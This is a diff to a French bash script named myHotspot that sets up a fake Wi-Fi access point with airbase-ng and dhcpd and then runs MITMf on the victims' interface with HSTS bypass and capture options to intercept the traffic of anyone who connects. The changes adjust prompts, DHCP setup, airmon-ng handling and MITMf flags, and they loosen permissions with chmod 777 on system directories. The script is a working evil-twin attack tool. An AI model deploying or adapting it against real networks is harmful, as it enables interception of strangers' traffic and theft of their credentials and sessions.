@@ -36,14 +36,15 @@ init() {
       echo
       route -n -A inet | grep UG
       echo
-      echo -e -n "$q\nEntrez l'IP connectée à un réseau, listée ci-dessus : $txtrst\n"
+      echo -e -n "$q\nEntrez l'IP connectée à un réseau listée ci-dessus (deuxième colonne) : $txtrst\n"
       read -e gatewayip
-      echo -e -n "$q\nEntrez l'interface connectée à un réseau, listée ci-dessus. Sélectionnez l'interface associée à l'IP précédemment choisie : $txtrst\n"
+      echo -e -n "$q\nEntrez l'interface connectée à un réseau, listée ci-dessus. Sélectionnez l'interface associée à l'IP précédemment choisie (dernière colonne) : $txtrst\n"
       read -e internet_interface
       echo -e -n "$q\nEntrez l'interface que vous souhaitez utiliser pour créer le point d'accès wifi. L'interface ne doit pas être connectée à internet : $txtrst\n"
       read -e fakeap_interface
       echo -e -n "$q\nEntrez le nom que vous souhaitez donner au point d'accès wifi (Ex: FreeWifi) : $txtrst\n"
       read -e ESSID
+      airmon-ng check kill
       airmon-ng start $fakeap_interface
       fakeap=$fakeap_interface
       fakeap_interface="mon0"
@@ -68,35 +69,15 @@ init() {
 
 setup() {
 
-# Création de la configuration DHCP
-mkdir -p "/pentest/wireless/myhotspot"
-echo "authoritative;
-
-default-lease-time 600;
-max-lease-time 7200;
-
-subnet 10.0.0.0 netmask 255.255.255.0 {
-option routers 10.0.0.1;
-option subnet-mask 255.255.255.0;
-
-option domain-name "\"$ESSID\"";
-option domain-name-servers 10.0.0.1;
-
-range 10.0.0.20 10.0.0.50;
-
-}" > /pentest/wireless/myhotspot/dhcpd.conf
-
 # Création du point d'accès wifi
 echo -e "$info\n[$q+$info] Configuration du point d'accès wifi $warn"
-xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & airbaseid=$!
+xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng -v --essid "$ESSID" -c 1 $fakeap_interface & airbaseid=$!
 disown
 sleep 3
 
 # Tables
 echo -e "$info\n[$q+$info] Configurations des tables et des redirections $warn"
 ifconfig lo up
-ifconfig at0 up &
-sleep 1
 ifconfig at0 10.0.0.1 netmask 255.255.255.0
 ifconfig at0 mtu 1400
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
@@ -115,20 +96,37 @@ sleep 3
 
 # DHCP
 echo -e "$info\n[$q+$info] Configuration et démarrage DHCP$txtrst"
+mkdir -p "/pentest/wireless/myhotspot"
+echo "authoritative;
+
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet 10.0.0.0 netmask 255.255.255.0 {
+option routers 10.0.0.1;
+option subnet-mask 255.255.255.0;
+
+option domain-name "\"$ESSID\"";
+option domain-name-servers 10.0.0.1;
+
+range 10.0.0.20 10.0.0.50;
+}" > /pentest/wireless/myhotspot/dhcpd.conf
 sleep 2
 chmod 777 /var/run/
 touch /var/run/dhcpd.pid
 chmod 777 /var/run/dhcpd.pid
 chown dhcpd:dhcpd /var/run/dhcpd.pid
-xterm -xrm '*hold: true' -geometry 75x20+1+240 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dhcpdid=$!
+chmod 777 /var/lib/dhcp/dhcpd.leases
+xterm -xrm '*hold: true' -geometry 75x20+1+240 -T DHCP -e dhcpd -f -d -cf /pentest/wireless/myhotspot/dhcpd.conf at0 & dhcpdid=$!
 disown
 sleep 1
+/etc/init.d/isc-dhcp-server start
 
 # MITMf
 echo -e "$info\n[$q+$info] Configuration et démarrage de MITMf $warn"
 cd /etc/MITMf
 echo -e "$txtrst"
-xterm -xrm '*hold: true' -geometry 120x30+1+350 -T MITMf -e python mitmf.py -i at0 --hsts --favicon -k -a --log-level debug -m & mitmfid=$!
+xterm -xrm '*hold: true' -geometry 120x30+1+350 -T MITMf -e python mitmf.py -i at0 --hsts --favicon -k --log-level debug --gateway 192.168.2.1 & mitmfid=$!
 disown
 cd /etc/myHotspot
 sleep 4
@@ -165,11 +163,15 @@ echo -e "$info[$q✔$info] iptables restaurée $txtrst\n"
 sleep 1
 airmon-ng stop $fakeap_interface
 airmon-ng stop $fakeap
+airmon-ng check kill
+sleep 2
+airmon-ng check kill
 echo -e "$info[$q✔$info] Airmon-ng stoppé $txtrst\n"
 sleep 1
 echo
 ifconfig $internet_interface up
 service network-manager restart
+/etc/init.d/isc-dhcp-server stop
 echo -e "$info\n[$q✔$info] Redémarrage du système internet"
 echo -e "[$q✔$info] Nettoyage et restauration terminé !"
 echo -e "[$q+$info] Merci d'utiliser myHotspot et à bientôt !"
